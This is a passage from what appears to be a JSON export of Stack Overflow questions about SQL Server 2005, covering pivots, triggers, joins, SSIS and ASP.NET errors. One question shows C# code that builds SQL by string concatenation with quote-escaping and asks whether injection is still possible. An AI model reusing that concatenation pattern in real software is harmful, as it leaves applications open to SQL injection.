files).</p>\n\n<p>Is the size of the data will increased or not when i migrate to filesystem?</p>\n\n<p>I am doing archive through c# and save into files.</p>\n\n<p>Some of the experts suggested the data of the filesystem is more as compared to the sql data.</p>\n\n<p>is it right or wrong</p>\n"},{"tags":["sql-server-2005","ejb-2.x"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12243111,"title":"Reusing same prepared statement for multiple queries in java","body":"<p>Which is better practice: Reusing same prepared statement for multiple queries by closing &amp; re-opening it. OR Using different prepared statements using the naming conventions for different queries ?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12242131,"title":"How to make dynamic column","body":"<p>I have some data as under</p>\n\n<pre><code>Declare @t table (Id int identity,CommaSeperatedValue varchar(100))\nInsert Into @t \nSelect 'Somalia,Vietnam' Union All \nSelect 'apple,banana,guava,India,Australia'\n</code></pre>\n\n<p>There is no limit in the CommaSeperated value. The desired output for the sample provided will be</p>\n\n<pre><code>Id  Col1    Col2    Col3    Col4    Col5\n1   Somalia Vietnam Null    Null    Null\n2   apple   banana  guava   India   Australia\n</code></pre>\n\n<p>That means , the columns will  be generated dynamically. Let us take another example</p>\n\n<pre><code>Declare @t table (Id int identity,CommaSeperatedValue varchar(100))\nInsert Into @t \nSelect 'Somalia,Vietnam,Honolulu,Spain' Union All \nSelect 'apple,banana,guava,India,Australia,Smart,Bus' Union All\nSelect 'Mango'\n</code></pre>\n\n<p>The desired output</p>\n\n<pre><code>Id  Col1    Col2    Col3    Col4    Col5        Col6    Col7    \n1   Somalia Vietnam Honolulu Spain  Null        Null    Null\n2   apple   banana  guava   India   Australia   Smart   Bus\n3   Mango   Null    Null    Null    Null        Null    Null\n</code></pre>\n\n<p>How to do this query?</p>\n\n<p>My attempt so far(after this I am lost) </p>\n\n<pre><code>SELECT \n    X.id,\n    X.CommaSeperatedValue,\n    Y.splitdata \nFROM\n (\n    SELECT *,\n    CAST('&lt;X&gt;'+REPLACE(F.CommaSeperatedValue,',','&lt;/X&gt;&lt;X&gt;')+'&lt;/X&gt;' AS XML) AS xmlfilter \n    FROM @t F\n )X\n CROSS APPLY\n ( \n    SELECT fdata.D.value('.','varchar(50)') as splitdata \n    FROM X.xmlfilter.nodes('X') as fdata(D)\n )Y\n</code></pre>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12241661,"title":"using name value pair to update record in database - sql server","body":"<p>Have been looking this up in Google but could not find anything.</p>\n\n<p>Wanted to know if there is a way in SQL Server 2005 that I could use Name Value pairs to update records in the db.</p>\n\n<p>I have a list of Name Value pairs and want to update all the records where Name could be found as a columm value (something that you would specify in where clause) and if the record is found ... update the record with the Value paired with the name</p>\n\n<p>For instance, something like</p>\n\n<pre><code>update X set column_value = &lt;Value paired with the Name&gt; where column_name = &lt;Name from the list&gt;\n</code></pre>\n\n<p>P.S. I have a list of more than 1000 records and this could be more.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":430,"score":2,"question_id":1661120,"title":"Multiple Record Update Fire A Trigger Once","body":"<p>I have a table where on a single record update, a trigger adds a history record in another\ntable.</p>\n\n<p>When I run a multiple record update on the table the trigger does not work since it was implemented to work with only one record and a trigger runs only once for a statement regardless if it affects multiple records. Is there a way to make this work?</p>\n\n<p>Can I use the following check:</p>\n\n<pre><code>**if @@rowcount = 1**\n</code></pre>\n\n<p>in order to handle a single record in the way it is handled now and in the else statement to handle it in another way(which I do not know)?</p>\n\n<p>The problem is how can I handle each case atomically when I have multiple records and how can I take every each record from the INSERTED table?</p>\n\n<p>The trigger currently initializes some variables from the INSERTED table, updates the datetime column on the same table and then attempts to insert a history record using the initialized variables I mentioned earlier. So these are the steps I would like to have supporting multiple records.</p>\n\n<p>Can anybody provide me with a simple example or guidelines?</p>\n\n<p>Thank you in advance</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":12206696,"title":"Using for XML in T-sql to pivot data","body":"<p>I am attempting to use the for XML function to pivot some data.  My data is as follows:</p>\n\n<pre><code>VenNum_A   VenNum_B\n0001       0002\n0001       0003\n0001       0004\n0005       0006\n0005       0007\n0005       0008\n</code></pre>\n\n<p>I am attempting to get the following result:</p>\n\n<pre><code>venNum_A   VenNum_B\n0001       0002,0003,0004\n0005       0006,0007,0008\n</code></pre>\n\n<p>My Code so far: </p>\n\n<pre><code>; with t as\n        (\n        select Distinct \n            A_VenNum, B_VenNum, SUM(1) as Cnt\n        From \n            #VenDups_Addr\n        Group by \n            A_VenNum, B_VenNum\n        )\n        select distinct\n            B_Vennum,\n             A_Vennum =cast(substring((\n            select distinct \n                  [text()] =  ', ' + t1.A_Vennum \n            from \n                  t as t1\n            where \n                t.A_Vennum =t1.A_VenNum\n            for XML path('')\n                ),3,99) as Varchar(254))\n\n        From t  \n</code></pre>\n\n<p>Currently my results are no different than slecting both original fields. </p>\n\n<p>Any help will be greatly appreciated. </p>\n\n<p>Also if this is not the best method of reaching my end goal I am totaly open to an alternate solution, This is the only way I know of doing this. </p>\n\n<p>Also excuse my poor formating</p>\n"},{"tags":["c#","sql","sql-server","sql-server-2005","sql-injection"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":153,"score":0,"question_id":12235262,"title":"SQL Injections with replace single-quotation and validate integers","body":"<p>I just want to know, If I replace every <code>'</code> with <code>''</code> in user inputs, for instance <code>string.Replace(\"'\",\"''\")</code>, and validate numbers (make sure that they are numbers, and do not contain any other character), is SQL Injection still possible? How?</p>\n\n<p>I'm using dynamic SQL queries, using <code>SqlCommand</code>. Something like this:</p>\n\n<pre><code>cmd.CommandText = \"SELECT * FROM myTable WHERE ID = \" + theID.ToString();\n</code></pre>\n\n<p>or</p>\n\n<pre><code>cmd.CommandText = \"UPDATE myTable SET title='\" + title.Replace(\"'\",\"''\") + \"' WHERE ID = \" + theID.ToString();\n</code></pre>\n\n<p>Input integers are automatically validated (checked whether they are a real number) in ASP.NET MVC.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","clustered-index"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":411,"score":0,"question_id":10799413,"title":"Clustered Indexes without Primary key","body":"<p>A <a href=\"http://www.simple-talk.com/sql/learn-sql-server/sql-server-index-basics/\" rel=\"nofollow\">clustered index</a> stores the actual data rows at the leaf level of the index. Returning to the example above, that would mean that the entire row of data associated with the primary key value of 123 would be stored in that leaf node.</p>\n\n<p><img src=\"http://i.stack.imgur.com/Rlhzv.jpg\" alt=\"enter image description here\"></p>\n\n<p><strong>Question</strong> - in case the primary key does not exists and I set the <code>Name</code> column as clustered index. In this case, will the above statement becomes contradictory?</p>\n"},{"tags":["sql-server-2005","entity-framework",".net-3.5"],"answer_count":5,"favorite_count":14,"up_vote_count":23,"down_vote_count":0,"view_count":14259,"score":23,"question_id":1013333,"title":"Entity Framework and Sql Server view question","body":"<p>For several reasons that I don't have the liberty to talk about, we are defining a view on our Sql Server 2005 database like so:</p>\n\n<pre>\nCREATE VIEW [dbo].[MeterProvingStatisticsPoint]\nAS\nSELECT\n    CAST(0 AS BIGINT) AS 'RowNumber',\n    CAST(0 AS BIGINT) AS 'ProverTicketId',\n    CAST(0 AS INT) AS 'ReportNumber',\n    GETDATE() AS 'CompletedDateTime',\n    CAST(1.1 AS float) AS 'MeterFactor',\n    CAST(1.1 AS float) AS 'Density',\n    CAST(1.1 AS float) AS 'FlowRate',\n    CAST(1.1 AS float) AS 'Average',\n    CAST(1.1 AS float) AS 'StandardDeviation',\n    CAST(1.1 AS float) AS 'MeanPlus2XStandardDeviation',\n    CAST(1.1 AS float) AS 'MeanMinus2XStandardDeviation'\nWHERE 0 = 1\n</pre>\n\n<p>The idea is that the Entity Framework will create an entity based on this query, which it does, but it generates it with an error that states the following:</p>\n\n<p>\"warning 6002: The table/view 'Keystone_Local.dbo.MeterProvingStatisticsPoint' does not have a primary key defined. The key has been inferred and the definition was created as a read-only table/view.\"</p>\n\n<p>And it decides that the CompletedDateTime field will be this entity primary key. </p>\n\n<p>We are using EdmGen to generate the model. Is there a way not to have the entity framework include any field of this view as a primary key?</p>\n\n<p>Thanks for help.</p>\n"},{"tags":["sql","sql-server-2005","date","varchar"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":65,"score":-4,"question_id":12229540,"title":"SQL 2005 compare Date saved as VARCHAR","body":"<p>I have saved dates as VARCHAR in sql server 2005\nnow I want to select all dates before 2013 and I can't.</p>\n\n<p>WDATE 09/01/2012\n      08/13/2012</p>\n\n<p>I want to compare those dates with any other date\nI am using this query:</p>\n\n<pre><code>SELECT * FROM Work_Order\nWHERE  WDATE  &lt; '09/02/2012'\n</code></pre>\n\n<p>but it subtract days then months then years which is not my case</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":236,"score":2,"question_id":12180854,"title":"TSQL - divide rows into groups based on one field","body":"<p>This is modified version of my earlier question: <a href=\"http://stackoverflow.com/questions/12059119/tsql-equally-divide-resultset-to-groups-and-update-them\">TSQL equally divide resultset to groups and update them</a> </p>\n\n<p>I have my database with 2 tables like so:</p>\n\n<p>Orders table has data like below:</p>\n\n<pre><code>OrderID    OperatorID    GroupID        OrderDesc    Status    Cash    ...\n--------------------------------------------------------------------------\n      1             1          1      small_order         1     300 \n      2             1          1    another_order         1       0 \n      3             1          2      xxxxxxxxxxx         2    1000 \n      5             2          2      yyyyyyyyyyy         2     150 \n      9             5          1      xxxxxxxxxxx         1      50 \n     10          NULL          2      xxxxxxxxxxx         1     150 \n     11          NULL          3      xxxxxxxxxxx         1     -50 \n     12             4          1      xxxxxxxxxxx         1     200 \n</code></pre>\n\n<p>Operators table:</p>\n\n<pre><code>OperatorID    Name    GroupID    Active\n---------------------------------------\n      1       John          1         1\n      2       Kate          1         1\n      4       Jack          2         1\n      5       Will          1         0\n      6        Sam          3         0\n</code></pre>\n\n<p>I'm able to equally divide my recordset into equally groups using below query:</p>\n\n<pre><code>SELECT o.*, op.operatorName AS NewOperator, op.operatorID AS NewOperatorId\nFROM (SELECT o.*, (ROW_NUMBER() over (ORDER BY newid()) % numoperators) + 1 AS randseqnum\n      FROM Orders o CROSS JOIN\n     (SELECT COUNT(*) AS numoperators FROM operators WHERE operators.active=1) op\n      WHERE o.status in (1,3)\n     ) o JOIN\n     (SELECT op.*, ROW_NUMBER() over (ORDER BY newid()) AS seqnum\n      FROM Operators op WHERE op.active=1\n     ) op\n     ON o.randseqnum = op.seqnum ORDER BY o.orderID\n</code></pre>\n\n<p>Demo available at: <a href=\"http://sqlfiddle.com/#!3/ff47b/1\" rel=\"nofollow\">http://sqlfiddle.com/#!3/ff47b/1</a></p>\n\n<p>Using script from above I can divide Orders to (almost) equal groups but based on number or Orders for Operator, but I need to modify it so that it will assign Operators to Orders based on sum or <code>Cash</code> for orders.</p>\n\n<p>For example:</p>\n\n<p>If I have 6 Orders with <code>Cash</code> values: 300, 0, 50, 150, -50, 200 they sum gives 650.<br />\nMy script should assign to 3 Operators random 2 Orders with random sum of <code>Cash</code> for Orders.<br />\nWhat I would like to get is to assign for example 300,-50 to operator1, 200, 0 to second and 150, 50 to third.<br />\nHope this sound clear :)</p>\n\n<p>Here is example output that I expect to get:</p>\n\n<pre><code>ORDERID  OPERATORID  GROUPID    DESCRIPTION  STATUS  CASH  NEWOPERATORID\n------------------------------------------------------------------------\n      1           1        1    small_order       1   300              2\n      2           1        1  another_order       1     0              1\n      9           5        1    xxxxxxxxxxx       1    50              4\n     10      (null)        2    xxxxxxxxxxx       1   150              4\n     11      (null)        3    xxxxxxxxxxx       1   -50              2\n     12           4        1    xxxxxxxxxxx       1   200              1\n</code></pre>\n\n<p><strong>How can I (if I can at all) assign Operators to my Orders so that sum or <code>Cash</code> will be closest to average</strong></p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12219655,"title":"Matching up tables to group properly","body":"<p>Im having a lot of trouble counting the amount of vendors per county, per state in our database.  Was hoping someone could help me out.  </p>\n\n<p>I have one table called vendors which lists the vendors id (key) and their current assignments.  </p>\n\n<p>the next table is called postal codes and the columns i need from it are postalcode, FIPS (this is a code for counties in the US) and state. this is simply a list of possible states, postal codes and fips</p>\n\n<p>my third table is vendoraddresses, which lists the addresses of each vendor but does not have a county or fips column or else this would be very easy. this is linked to the vendor table through the vendorid key</p>\n\n<p>the final table is counties, which has the county name for each fips code lined up in rows (ie: 12345 = county name) </p>\n\n<p>im having trouble working with all of these tables together to accurately count the vendors per county per state.  i feel like this really shouldn't be so hard but i hit a mental block i guess.  Below is what i have so far, but its not what i need. Im wondering if a union or something like that would be a better choice to get all these tables together.</p>\n\n<pre><code>SELECT\n\nva.state\n,pc.fips\n,count(v.vendorid) as vendors\n\n\nFROM \nVendors v\njoin vendoraddresses va on va.vendorid = v.vendorid\njoin postalcodes pc on pc.postalcode = va.postalcode\ngroup by va.state, fips\norder by va.state, fips\n</code></pre>\n\n<p>so with some help ive tried to make some progress:</p>\n\n<pre><code>SELECT \nState1\n,County\n,COUNT(Vendor) as Vendors\nFROM\n(\nSELECT\nc.name as County, pc.State as State1, v.VendorID as Vendor\nFROM \nVendors v\njoin vendorserviceareas vsa on vsa.vendorid = v.vendorid\njoin vendorserviceareaentries vsae on vsae.vendorserviceareaid =     vsa.vendorserviceareaid \njoin counties c on c.fips = vsae.fips\njoin postalcodes pc on pc.fips = c.fips\n\nunion \n\nselect c.name as county, s.name as state1, vsa.Vendorid as Vendor from states s\njoin counties c on c.fips = s.fips\njoin vendorserviceareaentries vsae on vsae.fips = c.fips\njoin vendorserviceareas vsa on vsae.vendorserviceareaid = vsa.vendorserviceareaid \n\n\n)a\nGROUP BY State1, County\nOrder BY State1, County\n</code></pre>\n\n<p>the additional tables i have added have the following columns (using abbreviations from query) vsa column 1 = serviceareaid (numerical ID), column 2 = vendorid (numerical id) column 3 =  description(text to describe area of service) (varchar(50)) </p>\n\n<p>the other table vsae has the following columns, column 1 = serviceareaid - same as above table, fips = county code (FK char (5)), and postal code (char (5))</p>\n\n<p>and for some more info each service are could be called \"california\" or somehting like that, the system then has each state, then county, then postal codes within each county listed for a service area, this is where most of my issue is lying because i can get any number of postal codes per county so im getting a false count for what im trying to do.</p>\n\n<p>My ultimate goal is to find out per county how many vendors i have without taking into account the postal codes of a county.</p>\n"},{"tags":["sql-server-2005"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":1163,"score":0,"question_id":451132,"title":"Sql Server Reporting Service without Full SQL Server","body":"<p>I am going to use SSRS to generate report for my website.\n<br>\nScenario:\n<br>\nI have 2 servers, Application server &amp; Database Server.\nI want to have reports(.rdl files) sitting on Application server(IIS) accessing data on SQL server(Database Server)</p>\n\n<p>In order to fulfil these requirement I require to install SQL server 2k5 on my Application server just for having SQL server reporting service. So I am just waisting one of licence of SQL server by installing that on Application server.</p>\n\n<p>Is anyone having any idea how to install only reporting service with SQL server 2k5??</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":59,"score":4,"question_id":12221466,"title":"SQL update with aggregate in WHERE clause","body":"<p>I'm trying to set the date field for column date to let's say '10/11/2012' in table 1 when the sum of all amounts table 2 related to that id (via fk_id) = 0. Here's what I mean:</p>\n\n<p>FROM:</p>\n\n<p>table 1    </p>\n\n<pre><code>    id    date\n    1     10/11/2011\n    2      \n    3     10/12/2011\n</code></pre>\n\n<p>table 2</p>\n\n<pre><code>    fk_id    amount\n    1     200\n    2     0\n    2     0\n    3     100\n</code></pre>\n\n<p>TO:</p>\n\n<p>table 1    </p>\n\n<pre><code>    id    date\n    1     10/11/2011\n    2     10/11/2012\n    3     10/12/2011\n</code></pre>\n\n<p>table 2</p>\n\n<pre><code>    fk_id    amount\n    1     200\n    2     0\n    2     0\n    3     100\n</code></pre>\n\n<p>This is what I have currently:</p>\n\n<pre><code>update table1\nset date = '10/11/2012\nFROM table1 inner join table 2 on table1.id = table2.fk_id\nHAVING sum(table2.amount) = 0\n</code></pre>\n\n<p>Can someone help me out here?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":100,"score":1,"question_id":12219200,"title":"OleDB Destination executes full rollback on error, Bulk Insert Task doesn't","body":"<p>I'm using SSIS and BIDS to process a text file who contains lots (millions) of records. I decided to use the Bulk Insert Task and it worked great but then the destination table needed an additional column with a default value on the insert operation and the Bulk Insert Task stopped working. After that, I decided to use a Derived Column with the defaul value and an OleDB Destination to insert the bulk data. It solved my last problem but generated a new one: If there is an error when inserting the data in the OleDB Destination, then it executes a full rollback and no row was added on my table, but when I used the Bulk Insert Task, there were rows based in the BatchSize configuration. Let me explain it with a sample:</p>\n\n<ul>\n<li>I use a text file with 5000 lines. The file contained a duplicate id (intentionally) between the rows 3000 and 4000.</li>\n<li>Before starting the DTS, the destination table was totally empty.</li>\n<li>Using Bulk Insert Task, after the error raised (and the DTS stopped), the destination table had 3000 rows. I set the <em>BatchSize</em> attribute to 1000.</li>\n<li>Using OleDB Destination, after the error raised, the destination table had 0 rows! I set the <em>Rows per batch</em> attribute to 1000 and the <em>Maximum insert commit size</em> to its max value: 2147483647. I tried changing last one to 0, no effect.</li>\n</ul>\n\n<p>Is this the normal behavior of OleDB Destination? Can someone provide me a guide about working with these tasks? Should I forget to use these tasks and use the <a href=\"http://msdn.microsoft.com/es-es/library/ms188365%28v=sql.90%29.aspx\" rel=\"nofollow\">Bulk Insert</a> from T-SQL?</p>\n\n<p>As a side note, I also tried following the instructions for <code>KEEPNULLS</code> in <a href=\"http://msdn.microsoft.com/en-us/library/ms187887.aspx\" rel=\"nofollow\">Keep Nulls or UseDefault Values During Bulk Import (SQL Server)</a> to not use the OleDB Destination task, but it didn't work (maybe is just me).</p>\n\n<hr>\n\n<p>EDIT: Additional info about the problem.</p>\n\n<p>Table structure (sample)</p>\n\n<p>Table T</p>\n\n<pre><code>id int, name varchar(50), processed int default 0\n</code></pre>\n\n<p>CSV File (sample)</p>\n\n<pre><code>1, hello\n2, world\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12216716,"title":"How to combine an aggregate sql query and a normal query?","body":"<p>I have a table in SQL Server 2005 that I want to aggregate data from, here is an example.</p>\n\n<pre><code>JobName       ProductionCounter       StartDate             EndDate               CounterName        Stage\n----------------------------------------------------------------------------------------------------------\n\n200           23                      2012-08-30 13:45:00                          Kilograms          Final\n200           2                       2012-08-30 13:45:00                          Bars               Final\n    [...]\n200           46                      2012-08-30 13:45:00   2012-08-30 17:23:00    Kilograms          Final\n200           4                       2012-08-30 13:45:00   2012-08-30 17:23:00    Bars               Final\n300           20                      2012-08-30 13:45:00                          Kilograms          1st\n300           10                      2012-08-30 18:12:00                          Bars               1st\n    [...]\n300           40                      2012-08-30 18:12:00   2012-08-30 19:17:00    Kilograms          1st\n300           20                      2012-08-30 18:12:00   2012-08-30 19:17:00    Bars               1st\n</code></pre>\n\n<p>I want to format this into the following</p>\n\n<pre><code>JobName      TotalKilos       TotalBars       StartDate             EndDate               Stage\n-----------------------------------------------------------------------------------------------\n200          69               6               2012-08-30 13:45:00   2012-08-30 17:23:00   Final\n300          60               30              2012-08-30 18:12:00   2012-08-30 19:17:00   1st\n</code></pre>\n\n<p>This has made me realise I know nothing about SQL. I have tried the following as a start</p>\n\n<pre><code>SELECT JobName, SUM(ProductionCounter)\nFROM vwOeeInterval\nWHERE (CounterName = 'Kilos')\nGROUP BY JobName\n\nSELECT JobName, SUM(ProductionCounter)\nFROM vwOeeInterval\nWHERE (CounterName = 'Bars')\nGROUP BY JobName\n</code></pre>\n\n<p>My questions are:</p>\n\n<ol>\n<li><p>How do I combine these into one query?</p></li>\n<li><p>How would I query for the columns such as <code>StartDate</code> and <code>Stage</code>? Especially where the <code>EndDate</code> is not filled in until the job completes?</p></li>\n</ol>\n\n<p>Any pointers would be much appreciated.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":12217740,"title":"when parameter value is omitted in stored procedure, want it to display for all values","body":"<p>in a stored procedure, when a parameter value is not specified, i want it to display result for all values in the column.</p>\n\n<p>I tried the code as below but if I leave blank the parameter field1 while executing it, it doesn't work and asks to supply the field1 value.</p>\n\n<pre><code>create procedure procedurename\ndeclare @startdate datetime, @enddate endtime, @field1 varchar(15)\n\nselect * from table1\nwhere field1 = @xyz or @xyz is null\nand date between @startdate and @enddate\n\nexecute procedurename @startdate = '01/07/2012', @enddate = '31/07/2012'\n</code></pre>\n\n<p><em>[i omitted field1 value so that it should display result for all values in field1 column between the two dates]</em> but it asks for parameter value.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","sql-update"],"answer_count":6,"favorite_count":13,"up_vote_count":37,"down_vote_count":0,"view_count":71658,"score":37,"question_id":982919,"title":"SQL update query using joins","body":"<p>I have to update a field with a value which is returned by a join of 3 tables.</p>\n\n<p>Example: </p>\n\n<pre><code>select\n    im.itemid\n    ,im.sku as iSku\n    ,gm.SKU as GSKU\n    ,mm.ManufacturerId as ManuId\n    ,mm.ManufacturerName\n    ,im.mf_item_number\n    ,mm.ManufacturerID\nfrom \n    item_master im, group_master gm, Manufacturer_Master mm \nwhere\n    im.mf_item_number like 'STA%'\n    and im.sku=gm.sku\n    and gm.ManufacturerID = mm.ManufacturerID\n    and gm.manufacturerID=34\n</code></pre>\n\n<p>I want to update the mf_item_number field values of table master with some  other value which is joined in the above condition.</p>\n\n<p>How to frame the SQL ?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":811,"score":1,"question_id":733587,"title":"How to delete a stubborn SQL 2005 Maintenance Plan","body":"<p>Our SQL 2005 server has a Maintenance Plan that cannot be deleted. </p>\n\n<p>When I try and delete it via Management Studio I get the following error:</p>\n\n<blockquote>\n  <p>An exception occurred while executing\n  a Transact-SQL statement or batch.\n  (Microsoft.SqlServer.ConnectionInfo)\n  -> The SELECT permission was denied on the object 'sysmaintplan_plans',\n  database 'msdb', schema 'dbo'.\n  (Microsoft SQL Server, Error: 229)</p>\n</blockquote>\n\n<p>Its SQL 2005 Enterprise Edition version 9.0.3042.0</p>\n\n<p>I have been able to modify the plan so that it doesn't do anything, but I can't rename it or delete it.</p>\n\n<p>I have a hunch that this might be something to do with Service Pack 2, as the Maintenance Plan may have been created before SP2 was applied, and I've heard some people had problems with that scenario.</p>\n\n<p>edit: I am logged in as sa</p>\n"},{"tags":["sql","sql-server-2005","join","aggregate"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12216240,"title":"How to combine an aggregate SQL query and normal query?","body":"<p>I have a table in SQL 2005 that I want to aggregate data from, here is an example.</p>\n\n<pre><code>JobName       ProductionCounter       StartDate             EndDate               CounterName        Stage\n----------------------------------------------------------------------------------------------------------\n\n200           23                      2012-08-30 13:45:00                          Kilograms          Final\n200           2                       2012-08-30 13:45:00                          Bars               Final\n    [...]\n200           46                      2012-08-30 13:45:00   2012-08-30 17:23:00    Kilograms          Final\n200           4                       2012-08-30 13:45:00   2012-08-30 17:23:00    Bars               Final\n300           20                      2012-08-30 13:45:00                          Kilograms          1st\n300           10                      2012-08-30 18:12:00                          Bars               1st\n    [...]\n300           40                      2012-08-30 18:12:00   2012-08-30 19:17:00    Kilograms          1st\n300           20                      2012-08-30 18:12:00   2012-08-30 19:17:00    Bars               1st\n\nI want to format this into the following\n\n\nJobName      TotalKilos       TotalBars       StartDate             EndDate               Stage\n-----------------------------------------------------------------------------------------------\n\n200          69               6               2012-08-30 13:45:00   2012-08-30 17:23:00   Final\n300          60               30              2012-08-30 18:12:00   2012-08-30 19:17:00   1st\n</code></pre>\n\n<p>This has made me realise I know nothing about SQL.  I have tried the following as a start</p>\n\n<pre><code>SELECT JobName, SUM(KiloCounter)\nFROM vwOeeInterval\nGROUP BY JobName\n\nSELECT JobName, SUM(BarCounter)\nFROM vwOeeInterval\nGROUP BY JobName\n</code></pre>\n\n<p>My questions are:</p>\n\n<ol>\n<li><p>How do I combine these into one query?</p></li>\n<li><p>How would I query for the columns such as StartDate and Stage?  Especially where the End Date\nis not filled in until the job completes?</p></li>\n</ol>\n\n<p>Any pointers would be much appreciated.</p>\n"},{"tags":["sql","sql-server-2005","ssis","data-conversion"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":80,"score":2,"question_id":12207019,"title":"SSIS User-Defined Types","body":"<p>We are trying to import data into our SQL 2005 database from flat files using SSIS packages.</p>\n\n<p>Our database has a CLR User-Defined Type that we use to hold some related information, lets call it dbo.CustomType.</p>\n\n<p>To create an object of dbo.CustomType in SQL, I can do the following:</p>\n\n<pre><code>DECLARE @Decimal1   DECIMAL(18,6),\n        @Int1       INT,\n        @Decimal2   DECIMAL(18,6),\n        @Int2       INT,\n        @Decimal3   DECIMAL(18,6)\n\n\nSELECT  @Decimal1   = 1.5,\n        @Int1       = 1,\n        @Decimal2   = 2.5,\n        @Int2       = 2,\n        @Decimal3   = 3\n\n\n\nSELECT \n    CONVERT(\n                dbo.CustomType,\n                CONVERT(VARCHAR(20), @Decimal1) + ';' + \n                CONVERT(VARCHAR(20), @Decimal2) + ':' +\n                CONVERT(VARCHAR(2), @Int1) + ';' +\n                CONVERT(VARCHAR(20), @Decimal3) + ':' +\n                CONVERT(VARCHAR(2),  @Int2)\n            )\n</code></pre>\n\n<p>In SSIS I have a dataset that has all of the columns represetend by the variables, but how can I combine them and convert them to dbo.CustomType?</p>\n\n<p>====</p>\n\n<p>UPDATE:</p>\n\n<p>I was able to insert the custom type when using an insert statement inside a OLE DB Command object instead of the OLE DB Destination.</p>\n\n<p>SO:</p>\n\n<pre><code>INSERT INTO Greg\nVALUES (CONVERT(dbo.CustomType, '1;1:1;1:1;'))\n</code></pre>\n\n<p>works, BUT</p>\n\n<pre><code>INSERT INTO Greg\nVALUES (Convert(dbo.Customtype, ?))\n</code></pre>\n\n<p>gives an error</p>\n\n<p>[OLE DB Command [3103]] Error: SSIS Error Code DTS_E_OLEDBERROR.  An OLE DB error has occurred. Error code: 0x80040E21.\nAn OLE DB record is available.  Source: \"Microsoft SQL Server Native Client 10.0\"  Hresult: 0x80040E21  Description: \"Invalid character value for cast specification\".</p>\n\n<p>It seems to be trying to convert my string column to byte stream, but whenever I try to change Param_0 to String in the advanced editor it keeps changing back to byte stream</p>\n"},{"tags":["sql-server-2005","replication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":720,"score":0,"question_id":1724322,"title":"Where is the log file located when verbose history logging is turned on for SQL 2005 replication?","body":"<p>I keep getting the The merge process was unable to create a new generation at the 'Subscriber'. Troubleshoot by restarting the synchronization with verbose history logging and specify an output file to which to write. (Source: MSSQL_REPL, Error number: MSSQL_REPL-2147200994)\nGet help: <a href=\"http://help/MSSQL%5FREPL-2147200994\" rel=\"nofollow\">http://help/MSSQL%5FREPL-2147200994</a> message.  I went ahead and followed the advice and from the Replication monitor->Agent Profile I changed the profile to Verbose history. Now, where is this file located?  There are not properties in Management studion to sepeify the location. Thank you. </p>\n"},{"tags":["sql-server-2005","unique-key"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":828,"score":4,"question_id":5982933,"title":"SQL Server 2005 unique key with null value","body":"<p>I have a table in SQL Server 2005 with a foreign key, and I want that foreign key to be a unique value or null. I've set it up as a unique key, but it won't allow me to have multiple nulls in the same table. Is it possible to do what I want?</p>\n"},{"tags":["c#","asp.net",".net","sql-server-2005","iis6"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":86,"score":1,"question_id":12205267,"title":"HttpException not being caught","body":"<p>I have this exception:</p>\n\n<pre><code>Server Error in '/datalab' Application.\n\nRequest timed out.\n\nDescription: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. \n\nException Details: System.Web.HttpException: Request timed out.\n\nSource Error: \n\nAn unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.\n\nStack Trace: \n\n\n[HttpException (0x80004005): Request timed out.]\n</code></pre>\n\n<p>But I added a Global.asax file to my /datalab and /datalab/powerstats directories (the datalab directory is the root while the page being timed out is datalab/powerstats/output.aspx):</p>\n\n<pre><code>&lt;%@ Application Language=\"C#\" %&gt;\n\n&lt;script runat=\"server\"&gt;\n\n\n\nvoid Application_Error(object sender, EventArgs e) \n{ \n    Exception exc = Server.GetLastError();\n\n  // Handle HTTP errors\n  if (exc.GetType() == typeof(HttpException))\n  {\n  Response.Write(\"&lt;h2&gt;Global Page Error&lt;/h2&gt;\\n\");\n\n        // The Complete Error Handling Example generates\n        // some errors using URLs with \"NoCatch\" in them;\n        // ignore these here to simulate what would happen\n        // if a global.asax handler were not implemented.\n        if 